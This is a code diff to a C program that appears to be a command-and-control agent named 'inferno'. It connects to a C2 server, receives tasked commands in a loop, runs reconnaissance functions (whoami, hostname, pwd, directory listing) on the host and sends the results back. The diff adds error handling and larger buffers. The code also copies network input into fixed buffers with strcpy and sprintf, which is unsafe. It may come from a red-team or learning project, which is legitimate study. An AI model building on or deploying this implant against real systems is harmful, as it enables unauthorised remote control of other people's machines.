@@ -11,6 +11,12 @@
 #define IP "127.0.0.1"
 #define PORT_HTTP 80
 
+//handle erros
+void error(char *message) {
+    fprintf(stderr, "%s: %s\n", message, strerror(errno));
+    exit(EXIT_FAILURE);
+}
+
 //networked part
 void networking();
 
@@ -37,6 +43,8 @@ void networking() {
     //socket http
     printf("Initializing socket...\n");
     int inferno_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (inferno_socket == -1)
+        error("Error initializing socket");
 
     //preparing http address
     struct sockaddr_in c2_address;
@@ -47,19 +55,19 @@ void networking() {
 
     //connect http
     printf("Connecting...\n");
-    int inferno_connect = connect(inferno_socket, (struct sockaddr *) &c2_address, sizeof(c2_address));
-    if (inferno_connect == -1) 
-        printf("Please be sure server port: %d is open\n", PORT_HTTP);
+    if (connect(inferno_socket, (struct sockaddr *) &c2_address, sizeof(c2_address)) == -1)
+        error("Error connecting");
     puts("Connected");
     
     while (1) {
     	//receiving http payload
-    	char receive[1024];
-    	int inferno_receive = recv(inferno_socket, receive, 1024, 0);
+    	char receive[2048];
+    	if (recv(inferno_socket, receive, 2048, 0) == -1)
+            error("Error receiving payload");
     	printf("Receiving:\n\n%s\n\n", receive);
         
         //copying original payload
-        char receive_copy[1024];
+        char receive_copy[2048];
         strcpy(receive_copy, receive);
   
         //parsing to extract payload
@@ -69,7 +77,7 @@ void networking() {
         char *command = strtok(command_start, "'");
 
         //copying original payload
-        char receive_copy2[1024];
+        char receive_copy2[2048];
         strcpy(receive_copy2, receive);
 
         //parsing to extract argument
@@ -82,7 +90,7 @@ void networking() {
         }
 
         //executing payload
-        char response[1024];
+        char response[2048];
         char *task;
         if (content_length_arg == NULL)
             task = executing(command, NULL);
@@ -94,10 +102,12 @@ void networking() {
 
     	//sending payload result
     	printf("Sending: '%s' from agent...\n", response);
-    	ssize_t inferno_send = send(inferno_socket, response, sizeof(response), 0);
+    	if (send(inferno_socket, response, sizeof(response), 0) == -1)
+            error("Error sending payload result");
     	printf("Sent:\n\n'%s' from agent...\n", response);
     }
-    close(inferno_socket);
+    if (close(inferno_socket) == -1)
+        error("Error closing socket");
 }
 
 char *executing(char *receive, char *arg) {
@@ -133,15 +143,15 @@ char *whoamiCommand() {
 
 //hostname syscall
 char *hostnameCommand() {
-    static char hostname[1024];
-    gethostname(hostname, 1024);
+    static char hostname[2048];
+    gethostname(hostname, 2048);
     return hostname;
 }
 
 //pwd syscall
 char *pwdCommand() {
-    static char directory[1024];
-    getcwd(directory, 1024);
+    static char directory[2048];
+    getcwd(directory, 2048);
     return directory;
 }
 
@@ -151,7 +161,7 @@ char *lsCommand(char *path) {
     char *error;
     if (path == NULL)
         path = ".";
-    char *buf = malloc(1024 * sizeof(char));
+    char *buf = malloc(2048 * sizeof(char));
     DIR *dirp = opendir(path);
     if (dirp == NULL) {
         error = "Cannot open directory";
@@ -162,8 +172,8 @@ char *lsCommand(char *path) {
     sprintf(buf, "Type\t\tSize\tName\n");
     sprintf(buf + strlen(buf), "====\t\t====\t====\n");
     while ((list = readdir(dirp)) != NULL) {
-        char type[1024];
-        char pathname[1024];
+        char type[2048];
+        char pathname[2048];
         sprintf(pathname, "%s/%s", path, list->d_name);
         lstat(pathname, &sb);
         switch (sb.st_mode & S_IFMT) {
